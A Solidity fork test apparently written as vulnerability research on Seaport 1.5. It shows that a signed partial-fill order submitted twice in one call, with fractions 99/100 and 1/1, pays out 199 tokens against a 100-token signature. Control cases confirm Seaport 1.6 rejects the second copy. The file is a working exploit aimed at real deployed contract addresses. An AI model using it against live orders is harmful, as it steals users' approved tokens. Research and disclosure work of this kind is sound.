// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {
    AdvancedOrder,
    ConsiderationItem,
    CriteriaResolver,
    Execution,
    FulfillmentComponent,
    OfferItem,
    Order
} from "seaport-types/src/lib/ConsiderationStructs.sol";
import { ItemType, OrderType } from
    "seaport-types/src/lib/ConsiderationEnums.sol";
import { ConsiderationInterface } from
    "seaport-types/src/interfaces/ConsiderationInterface.sol";
import { ConduitInterface } from
    "seaport-types/src/interfaces/ConduitInterface.sol";
import { ConduitTransfer } from
    "seaport-types/src/lib/ConsiderationStructs.sol";
import { BaseOrderTest } from "./utils/BaseOrderTest.sol";

contract Seaport15ConduitOverfillFork is BaseOrderTest {
    address constant SEAPORT_15 =
        0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC;
    address constant SEAPORT_16 =
        0x0000000000000068F116a894984e2DB1123eB395;
    address constant OPENSEA_CONDUIT =
        0x1e0049783f008a0085193e00003d00cd54003c71;

    uint256 constant SIGNED = 100 ether;

    bytes32 internal conduitKey;

    function setUp() public override {
        vm.setEnv("SEAPORT_COVERAGE", "true");
        super.setUp();
        conduitKey = vm.envBytes32("OPENSEA_CONDUIT_KEY");

        assertGt(SEAPORT_15.code.length, 0);
        assertGt(SEAPORT_16.code.length, 0);
        assertGt(OPENSEA_CONDUIT.code.length, 0);
    }

    function testSeaport15DirectSingleTransactionOverfill() public {
        _run(
            ConsiderationInterface(SEAPORT_15),
            bytes32(0),
            SEAPORT_15,
            "s15-direct",
            true
        );
    }

    function testSeaport15CanonicalConduitSingleTransactionOverfill()
        public
    {
        _run(
            ConsiderationInterface(SEAPORT_15),
            conduitKey,
            OPENSEA_CONDUIT,
            "s15-canonical-conduit",
            true
        );
    }

    function testSeaport16DirectControlRejectsSecondCopy() public {
        _run(
            ConsiderationInterface(SEAPORT_16),
            bytes32(0),
            SEAPORT_16,
            "s16-direct-control",
            false
        );
    }

    function testSeaport16ConduitControlRejectsSecondCopy() public {
        _run(
            ConsiderationInterface(SEAPORT_16),
            conduitKey,
            OPENSEA_CONDUIT,
            "s16-conduit-control",
            false
        );
    }

    function testDirectConduitCallByAttackerFails() public {
        address victim = makeAddr("direct-conduit-victim");
        address attacker = makeAddr("direct-conduit-attacker");
        token1.mint(victim, SIGNED);
        vm.prank(victim);
        token1.approve(OPENSEA_CONDUIT, type(uint256).max);

        ConduitTransfer[] memory transfers = new ConduitTransfer[](1);
        transfers[0] = ConduitTransfer({
            itemType: ItemType.ERC20,
            token: address(token1),
            from: victim,
            to: attacker,
            identifier: 0,
            amount: SIGNED
        });

        vm.prank(attacker);
        (bool ok,) = OPENSEA_CONDUIT.call(
            abi.encodeWithSelector(
                ConduitInterface.execute.selector,
                transfers
            )
        );
        assertFalse(ok);
        assertEq(token1.balanceOf(victim), SIGNED);
        assertEq(token1.balanceOf(attacker), 0);
    }

    function _run(
        ConsiderationInterface target,
        bytes32 makerConduitKey,
        address approvalTarget,
        string memory label,
        bool expectOverfill
    ) internal {
        (address victim, uint256 victimKey) =
            makeAddrAndKey(string.concat(label, "-victim"));
        address attacker = makeAddr(string.concat(label, "-attacker"));

        token1.mint(victim, 3 * SIGNED);
        vm.prank(victim);
        token1.approve(approvalTarget, type(uint256).max);

        addOfferItem(OfferItem({
            itemType: ItemType.ERC20,
            token: address(token1),
            identifierOrCriteria: 0,
            startAmount: SIGNED,
            endAmount: SIGNED
        }));
        configureOrderParameters(payable(victim));
        baseOrderParameters.orderType = OrderType.PARTIAL_OPEN;
        baseOrderParameters.startTime = block.timestamp - 1;
        baseOrderParameters.endTime = block.timestamp + 1 days;
        baseOrderParameters.salt = uint256(keccak256(bytes(label)));
        baseOrderParameters.conduitKey = makerConduitKey;
        configureOrderComponents(target);
        bytes32 orderHash = target.getOrderHash(baseOrderComponents);
        Order memory signedOrder = Order({
            parameters: baseOrderParameters,
            signature: signOrder(target, victimKey, orderHash)
        });
        AdvancedOrder memory template = toAdvancedOrder(signedOrder);

        AdvancedOrder[] memory orders = new AdvancedOrder[](2);
        orders[0] = template;
        orders[0].numerator = 99;
        orders[0].denominator = 100;
        orders[1] = template;
        orders[1].numerator = 1;
        orders[1].denominator = 1;

        FulfillmentComponent[][] memory offerGroups =
            new FulfillmentComponent[][](2);
        offerGroups[0] = new FulfillmentComponent[](1);
        offerGroups[1] = new FulfillmentComponent[](1);
        offerGroups[0][0] = FulfillmentComponent({
            orderIndex: 0,
            itemIndex: 0
        });
        offerGroups[1][0] = FulfillmentComponent({
            orderIndex: 1,
            itemIndex: 0
        });

        uint256 victimBefore = token1.balanceOf(victim);
        uint256 attackerBefore = token1.balanceOf(attacker);

        vm.prank(attacker);
        (
            bool[] memory available,
            Execution[] memory executions
        ) = target.fulfillAvailableAdvancedOrders(
            orders,
            new CriteriaResolver[](0),
            offerGroups,
            new FulfillmentComponent[][](0),
            bytes32(0),
            attacker,
            2
        );

        uint256 loss = victimBefore - token1.balanceOf(victim);
        uint256 gain = token1.balanceOf(attacker) - attackerBefore;
        (,, uint256 statusN, uint256 statusD) =
            target.getOrderStatus(orderHash);

        emit log_named_string("OF_CASE", label);
        emit log_named_uint("OF_AVAILABLE_0", available[0] ? 1 : 0);
        emit log_named_uint("OF_AVAILABLE_1", available[1] ? 1 : 0);
        emit log_named_uint("OF_EXECUTIONS", executions.length);
        emit log_named_uint("OF_SIGNED", SIGNED);
        emit log_named_uint("OF_VICTIM_LOSS", loss);
        emit log_named_uint("OF_ATTACKER_GAIN", gain);
        emit log_named_uint("OF_STATUS_N", statusN);
        emit log_named_uint("OF_STATUS_D", statusD);

        if (expectOverfill) {
            assertEq(available[0], true);
            assertEq(available[1], true);
            assertEq(loss, 199 ether);
            assertEq(gain, 199 ether);
            assertGt(loss, SIGNED);
        } else {
            assertEq(available[0], true);
            assertEq(available[1], false);
            assertEq(loss, 99 ether);
            assertEq(gain, 99 ether);
        }
    }
}
